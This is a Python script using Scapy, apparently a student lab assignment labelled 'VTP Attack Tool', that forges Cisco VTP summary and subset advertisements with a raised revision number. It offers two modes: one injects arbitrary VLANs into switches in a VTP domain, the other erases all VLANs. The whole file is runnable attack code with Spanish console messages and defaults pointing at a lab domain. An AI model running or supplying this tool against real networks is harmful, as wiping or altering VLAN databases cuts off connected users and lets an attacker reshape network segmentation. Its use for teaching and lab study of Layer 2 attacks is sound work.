#!/usr/bin/env python3
# VTP Attack Tool | Matricula: 2023-0316 | ITLA

from scapy.all import *
import struct, argparse, sys, time, os

DOMINIO = "LAB-2023-0316"
REVISION = 127
INTERFAZ = "eth1"
MAC_VTP = "01:00:0c:cc:cc:cc"

def snap(): return b'\xaa\xaa\x03\x00\x00\x0c\x20\x03'

def summary(dom, rev):
    d = dom.encode().ljust(32,b'\x00')[:32]
    return b'\x01\x01\x01'+bytes([len(dom)])+d+struct.pack('>I',rev)+b'\xc0\xa8\x01\x01'+b'\x00'*28

def subset(dom, rev, vlans):
    d = dom.encode().ljust(32,b'\x00')[:32]
    data=b''
    for v in vlans:
        n=v['name'].encode(); p=(4-len(n)%4)%4
        data+=bytes([12+len(n)+p])+b'\x00\x01'+bytes([len(n)])+struct.pack('>H',v['id'])+b'\x05\xdc'+struct.pack('>I',v['id'])+n+b'\x00'*p
    return b'\x01\x02\x01'+bytes([len(dom)])+d+struct.pack('>I',rev)+data

def send_frame(payload, iface, desc):
    sendp(Ether(dst=MAC_VTP)/Raw(load=snap()+payload), iface=iface, verbose=False)
    print(f"[+] {desc} enviado")

def agregar(iface,dom,rev,vlans):
    print(f"[ATAQUE] Agregando VLANs: {[v['id'] for v in vlans]}")
    send_frame(summary(dom,rev),iface,"Summary"); time.sleep(0.5)
    send_frame(subset(dom,rev,vlans),iface,"Subset")
    print("[OK] VLANs inyectadas")

def borrar(iface,dom,rev):
    print("[ATAQUE] Borrando todas las VLANs")
    send_frame(summary(dom,rev),iface,"Summary"); time.sleep(0.5)
    send_frame(subset(dom,rev,[]),iface,"Subset VACIO")
    print("[OK] VLANs eliminadas")

def main():
    p=argparse.ArgumentParser(description="VTP Attack | 2023-0316")
    p.add_argument("-i",default=INTERFAZ)
    p.add_argument("-d",default=DOMINIO)
    p.add_argument("-r",type=int,default=REVISION)
    p.add_argument("-a",choices=["agregar","borrar"],required=True)
    p.add_argument("--vlans",nargs="+",default=["100:VLAN-ATAQUE"])
    a=p.parse_args()
    if a.a=="agregar":
        vs=[{"id":int(v.split(":")[0]),"name":v.split(":")[1]} for v in a.vlans]
        agregar(a.i,a.d,a.r,vs)
    else: borrar(a.i,a.d,a.r)

if __name__=="__main__":
    if os.geteuid()!=0: sys.exit("[!] Root requerido")
    main()
